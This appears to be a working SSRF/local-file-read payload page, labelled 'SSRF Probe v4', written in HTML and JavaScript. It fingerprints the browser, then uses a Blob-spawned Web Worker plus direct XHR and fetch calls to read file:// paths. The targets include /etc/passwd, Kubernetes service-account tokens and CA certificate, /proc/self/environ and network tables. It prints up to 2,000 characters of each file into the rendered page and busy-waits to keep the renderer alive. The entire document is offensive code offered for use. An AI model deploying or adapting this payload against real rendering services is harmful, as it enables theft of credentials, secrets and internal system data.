<html><body>
<h2>SSRF Probe v4 - Worker File Read</h2>
<pre id="r"></pre>
<script>
var R=document.getElementById('r');
function L(s){R.textContent+=s+'\n';}

L('UA: '+navigator.userAgent);
L('Cores: '+navigator.hardwareConcurrency+' Mem: '+(navigator.deviceMemory||'?')+'GB');
L('Webdriver: '+navigator.webdriver);
L('Location: '+location.href);

// Web Worker file read (bug #330 technique)
L('\n== Worker File Read ==');

var workerCode = '\
self.onmessage = function(e) {\
  var results = [];\
  for (var i = 0; i < e.data.length; i++) {\
    try {\
      var xhr = new XMLHttpRequest();\
      xhr.open("GET", e.data[i], false);\
      xhr.send();\
      results.push({file: e.data[i], status: xhr.status, len: xhr.responseText.length, body: xhr.responseText.substring(0, 2000)});\
    } catch(err) {\
      results.push({file: e.data[i], error: err.message});\
    }\
  }\
  self.postMessage(results);\
};';

var workerDone = false;
try {
  var blob = new Blob([workerCode], {type: 'text/javascript'});
  var worker = new Worker(URL.createObjectURL(blob));
  L('Worker created OK');

  worker.onmessage = function(e) {
    workerDone = true;
    var results = e.data;
    L('Worker returned ' + results.length + ' results');
    for (var i = 0; i < results.length; i++) {
      var r = results[i];
      if (r.error) {
        L('[FAIL] ' + r.file + ': ' + r.error);
      } else {
        L('[READ] ' + r.file + ' status=' + r.status + ' len=' + r.len);
        L(r.body);
      }
    }
  };

  worker.onerror = function(e) {
    workerDone = true;
    L('Worker ERROR: ' + e.message + ' at ' + e.filename + ':' + e.lineno);
  };

  worker.postMessage([
    'file:///etc/passwd',
    'file:///etc/hostname',
    'file:///etc/resolv.conf',
    'file:///var/run/secrets/kubernetes.io/serviceaccount/token',
    'file:///var/run/secrets/kubernetes.io/serviceaccount/namespace',
    'file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
    'file:///proc/self/cgroup',
    'file:///proc/self/environ',
    'file:///proc/net/tcp',
    'file:///etc/os-release'
  ]);
  L('Messages sent to worker, waiting...');
} catch(e) {
  L('Worker create FAILED: ' + e.message);
  workerDone = true;
}

// Also try direct main-thread file read (expected to fail but test it)
L('\n== Main Thread file:// ==');
try {
  var x = new XMLHttpRequest();
  x.open('GET', 'file:///etc/passwd', false);
  x.send();
  L('Main XHR: status=' + x.status + ' len=' + x.responseText.length);
  L(x.responseText.substring(0, 500));
} catch(e) {
  L('Main XHR: ' + e.message);
}

// Also try fetch file://
try {
  // Can't do sync fetch, so just fire and forget
  fetch('file:///etc/passwd').then(function(r){
    return r.text();
  }).then(function(t){
    L('Main fetch file: len=' + t.length);
    L(t.substring(0, 500));
  }).catch(function(e){
    L('Main fetch file: ' + e.message);
  });
} catch(e) {
  L('Main fetch file catch: ' + e.message);
}

// Busy wait to keep page alive for Worker to finish
L('\nBusy-waiting 12s for worker...');
var start = Date.now();
while (Date.now() - start < 12000) {
  // Yield briefly every 100ms to let Worker messages process
  if ((Date.now() - start) % 1000 < 10 && !workerDone) {
    // Can't yield in busy wait, but Worker msg queue will process after
  }
}
L('Wait done. workerDone=' + workerDone);
L('\n== DONE v4 ==');
</script>
</body></html>
